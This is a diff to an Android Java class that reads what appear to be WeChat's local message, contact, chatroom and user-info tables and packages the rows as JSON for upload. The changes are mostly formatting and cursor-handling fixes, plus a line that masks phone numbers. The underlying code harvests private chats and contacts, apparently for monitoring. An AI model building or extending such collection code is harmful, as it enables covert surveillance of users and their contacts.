@@ -25,7 +25,7 @@ public class WXDataFormJsonUtil {
     private static final String TAG = WXDataFormJsonUtil.class.getSimpleName();
 
 
-    public static ArrayList<Object> getMessageDataInDB(Context context,SQLiteDatabase dataTarget,File file) {
+    public static ArrayList<Object> getMessageDataInDB(Context context, SQLiteDatabase dataTarget, File file) {
         long message_last_upload_time = ShareData.getInstance().getLongValue(context, GlobalCofig.MESSAGE_LAST_UPLOAD_TIME + file.getPath(), 0);
         LogInputUtil.e(TAG, "取出的的message_last_upload_time = " + message_last_upload_time);
 
@@ -35,7 +35,7 @@ public class WXDataFormJsonUtil {
         try {
             cr = dataTarget.rawQuery("select * from message where createTime > " + message_last_upload_time + " limit " + GlobalCofig.UPLOAD_NUMBER, null);
             if (cr.moveToFirst()) {
-                MyLog.inputLogToFile(TAG,"message 表准备上传数据条数= "+cr.getCount()+",时间为 = "+Utils.transForDate(message_last_upload_time)+"("+message_last_upload_time+")");
+                MyLog.inputLogToFile(TAG, "message 表准备上传数据条数= " + cr.getCount() + ",时间为 = " + Utils.transForDate(message_last_upload_time) + "(" + message_last_upload_time + ")");
                 for (int j = 0; j < cr.getCount(); j++) {
 
                     long msgId = CursorUtil.getLong(cr, "msgId");
@@ -47,6 +47,7 @@ public class WXDataFormJsonUtil {
                     long createTime = CursorUtil.getLong(cr, "createTime");
                     String talker = CursorUtil.getString(cr, "talker");
                     String content = CursorUtil.getString(cr, "content");
+                    content = Utils.replacePhoneNumber(content);
                     String imgPath = CursorUtil.getString(cr, "imgPath");
                     String reserved = CursorUtil.getString(cr, "reserved");
                     String transContent = CursorUtil.getString(cr, "transContent");
@@ -81,9 +82,9 @@ public class WXDataFormJsonUtil {
 
                     if (j == cr.getCount() - 1) {
                         String timeTemporaryStr = GlobalCofig.MESSAGE_LAST_UPLOAD_TIME_TEMPORARY + file.getPath();
-                        ShareData.getInstance().saveLongValue(context, timeTemporaryStr , createTime);
+                        ShareData.getInstance().saveLongValue(context, timeTemporaryStr, createTime);
                         long timeTemporary = ShareData.getInstance().getLongValue(context, timeTemporaryStr, 0);
-                        LogInputUtil.e(TAG, "当前时间（临时）："+timeTemporaryStr+" = " + timeTemporary);
+                        LogInputUtil.e(TAG, "当前时间（临时）：" + timeTemporaryStr + " = " + timeTemporary);
                     }
 
                     daoList.add(dao);
@@ -92,7 +93,7 @@ public class WXDataFormJsonUtil {
             }
             cr.close();
         } catch (Exception e) {
-            LogInputUtil.e(TAG, "查询表messge异常，msg = " + e.getMessage());
+            MyLog.inputLogToFile(TAG, "查询表messge异常，msg = " + e.getMessage());
             daoList = null;
         } finally {
             if (cr != null)
@@ -103,11 +104,12 @@ public class WXDataFormJsonUtil {
     }
 
     public static ArrayList<Object> getChatRoomDataInDB(SQLiteDatabase dataTarget) {
-        Cursor cr = dataTarget.rawQuery("select * from chatroom", null);
+        Cursor cr =null;
         ArrayList<Object> daoList = new ArrayList<Object>();
         try {
+            cr = dataTarget.rawQuery("select * from chatroom", null);
             if (cr.moveToFirst()) {
-                MyLog.inputLogToFile(TAG,"chatroom 表准备上传数据条数= "+cr.getCount());
+                MyLog.inputLogToFile(TAG, "chatroom 表准备上传数据条数= " + cr.getCount());
                 for (int j = 0; j < cr.getCount(); j++) {
 
                     String chatroomname = CursorUtil.getString(cr, "chatroomname");
@@ -157,7 +159,7 @@ public class WXDataFormJsonUtil {
             }
             cr.close();
         } catch (Exception e) {
-            LogInputUtil.e(TAG, "查询表chatroom异常，msg = " + e.getMessage());
+            MyLog.inputLogToFile(TAG, "查询表chatroom异常，msg = " + e.getMessage());
         } finally {
             if (cr != null)
                 cr.close();
@@ -168,11 +170,12 @@ public class WXDataFormJsonUtil {
     }
 
     public static ArrayList<Object> getRcontactDataInDB(SQLiteDatabase dataTarget) {
-        Cursor cr = dataTarget.rawQuery("select * from rcontact", null);
+        Cursor cr = null;
         ArrayList<Object> daoList = new ArrayList<Object>();
         try {
+             cr = dataTarget.rawQuery("select * from rcontact", null);
             if (cr.moveToFirst()) {
-                MyLog.inputLogToFile(TAG,"rcontact 表准备上传数据条数= "+cr.getCount());
+                MyLog.inputLogToFile(TAG, "rcontact 表准备上传数据条数= " + cr.getCount());
 
                 for (int j = 0; j < cr.getCount(); j++) {
 
@@ -226,7 +229,7 @@ public class WXDataFormJsonUtil {
             }
             cr.close();
         } catch (Exception e) {
-            LogInputUtil.e(TAG, "查询表chatroom异常，msg = " + e.getMessage());
+            MyLog.inputLogToFile(TAG, "查询表chatroom异常，msg = " + e.getMessage());
         } finally {
             if (cr != null)
                 cr.close();
@@ -236,9 +239,10 @@ public class WXDataFormJsonUtil {
     }
 
     public static ArrayList<Object> getImgFlagDataInDB(SQLiteDatabase dataTarget) {
-        Cursor cr = dataTarget.rawQuery("select * from img_flag", null);
+        Cursor cr = null;
         ArrayList<Object> daoList = new ArrayList<Object>();
         try {
+            cr = dataTarget.rawQuery("select * from img_flag", null);
             if (cr.moveToFirst()) {
                 for (int j = 0; j < cr.getCount(); j++) {
 
@@ -265,7 +269,7 @@ public class WXDataFormJsonUtil {
             }
             cr.close();
         } catch (Exception e) {
-            LogInputUtil.e(TAG, "查询表ImgFlag异常，msg = " + e.getMessage());
+            MyLog.inputLogToFile(TAG, "查询表ImgFlag异常，msg = " + e.getMessage());
         } finally {
             if (cr != null)
                 cr.close();
@@ -284,11 +288,12 @@ public class WXDataFormJsonUtil {
         String json = gson.toJson(uploadDataDao);
         return json;
     }*/
+
     /**
-     *打包封装需要上传的数据
+     * 打包封装需要上传的数据
      **/
-    public static String getUploadJsonStr(String tag,ArrayList<Object> dataList,String pathUin,String deviceID,String userName){
-        if(tag == null || tag.equals("") || dataList == null || dataList.size() <= 0)return "";
+    public static String getUploadJsonStr(String tag, ArrayList<Object> dataList, String pathUin, String deviceID, String userName) {
+        if (tag == null || tag.equals("") || dataList == null || dataList.size() <= 0) return "";
         UploadDataDao uploadDataDao = new UploadDataDao();
         uploadDataDao.setUserUin(pathUin);
         uploadDataDao.setUserTag(tag);
@@ -302,11 +307,12 @@ public class WXDataFormJsonUtil {
     }
 
     public static ArrayList<Object> getUserInfoDataInDB(SQLiteDatabase dataTarget) {
-        Cursor cr = dataTarget.rawQuery("select * from userinfo", null);
+        Cursor cr = null;
         ArrayList<Object> daoList = new ArrayList<Object>();
         try {
+            cr = dataTarget.rawQuery("select * from userinfo", null);
             if (cr.moveToFirst()) {
-                MyLog.inputLogToFile(TAG,"userinfo 表准备上传数据条数= "+cr.getCount());
+                MyLog.inputLogToFile(TAG, "userinfo 表准备上传数据条数= " + cr.getCount());
                 for (int j = 0; j < cr.getCount(); j++) {
 
                     int id = CursorUtil.getInt(cr, "id");
@@ -324,7 +330,7 @@ public class WXDataFormJsonUtil {
             }
             cr.close();
         } catch (Exception e) {
-            LogInputUtil.e(TAG, "查询表ImgFlag异常，msg = " + e.getMessage());
+            MyLog.inputLogToFile(TAG, "查询表ImgFlag异常，msg = " + e.getMessage());
         } finally {
             if (cr != null)
                 cr.close();
